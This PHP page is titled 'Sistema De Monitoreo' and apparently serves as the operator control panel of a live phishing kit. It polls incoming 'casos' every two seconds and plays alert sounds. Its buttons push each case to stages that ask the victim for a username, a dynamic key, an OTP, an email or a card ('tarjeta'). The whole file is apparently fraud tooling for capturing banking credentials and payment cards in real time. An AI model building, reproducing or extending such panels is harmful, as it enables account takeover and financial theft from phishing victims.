<?php 

require('../lib/funciones.php');
 ?>
 <?php
  session_start();

  if (!isset($_SESSION['username'])) {
  	$_SESSION['msg'] = "You must log in first";
  	header('location: login.php');
  }
  if (isset($_GET['logout'])) {
  	session_destroy();
  	unset($_SESSION['username']);
  	header("location: login.php");
  }
?>
<head>
	<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/png" href="../monitor.png">
	<title>Sistema De Monitoreo</title>
	<link href="../css/styles.css" rel="stylesheet">	
	<script type="text/javascript" src="../js/functions.js"></script>	
	<script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>	
	<style type="text/css">
		@media (max-width: 920px) {
		  
		}		
	</style>
	
	  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/png" href="monitor.png">
	
	<link href="css/styles.css" rel="stylesheet">	
	<script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>	
    	<link rel="stylesheet" type="text/css" href="style.css">
		
		
</head>
<body>
	<div class="header">
	<h2>KAMEHOUSE</h2>
 </div>
	<audio class="timbre timbre-normal">
	 <source src="../audio/timbre.mp3" type="audio/mpeg">
	Your browser does not support the audio element.
	</audio>

	<audio class="timbre timbre-otp">
	 <source src="../audio/electrico.mp3" type="audio/mpeg">
	Your browser does not support the audio element.
	</audio>

	<div class="content">
  	<!-- notification message -->
  	<?php if (isset($_SESSION['success'])) : ?>
      <div class="error success" >
      	<h3>
          <?php
          	echo $_SESSION['success'];
          	unset($_SESSION['success']);
          ?>
      	</h3>
      </div>
  	<?php endif ?>

    <!-- logged in user information -->
    <?php  if (isset($_SESSION['username'])) : ?>
    	<p>Bienvenido <strong><?php echo $_SESSION['username']; ?></strong></p>
    	<p> <a href="index.php?logout='1'" style="color: red;">Salir</a> </p>
    <?php endif ?>
</div>
	<div class="contenido">
			<?php
				cargar_casos();											
			?>		
	</div>	
</body>
<script type="text/javascript">
	$(document).ready(function(){	

		setInterval(actualizar_casos,2000);	

		$(document).on('click', '.usuario', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"12" },function(data) {

			});
 		});

 		$(document).on('click', '.dinamica', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"2" },function(data) {

			});
 		});

 		$(document).on('click', '.otp', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"8" },function(data) {

			});
 		});

 		$(document).on('click', '.correo', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"4" },function(data) {
				
			});
 		});

 		$(document).on('click', '.tarjeta', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"6" },function(data) {
				
			});
 		});

 		$(document).on('click', '.finalizar', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"10" },function(data) {
				
			});
 		});

	});
</script>